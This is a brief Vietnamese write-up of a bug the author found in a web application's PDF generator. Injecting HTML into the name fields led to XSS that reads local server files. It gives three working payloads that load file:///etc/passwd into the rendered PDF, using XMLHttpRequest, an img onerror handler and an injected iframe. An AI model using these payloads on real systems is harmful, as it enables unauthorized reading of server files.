# Tận dụng XSS để đọc các tệp nội bộ
Mọi người đều quen thuộc với việc chuyển tiếp nhanh XSS một chút, XSS trong trình tạo PDF trên ứng dụng cho phép tôi đọc các tệp cục bộ trên hệ thống.
# XSS => LFI
Vì vậy, tôi đã thử nhập HTML bình thường để xem liệu nó có được hiển thị trong đầu ra PDF được tạo hay không.
```
login = <h1>huy1</h1>
frist name = <h1>huy2</h1>
Last name = <h1>huy3</h1>
```
và tôi test gen thì ở đây có bị xss ở huy2 và huy3.  

Đây là cách tôi đọc file tôi có 3 payload.

```
<script>
    x=new XMLHttpRequest;
    x.onload=function(){
        document.write(this.responseText)
    };
    x.open("GET","file:///etc/passwd");
    x.send();
</script>

<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>

<script>document.write('<iframe src=file:///etc/passwd></iframe>');</scrip>

```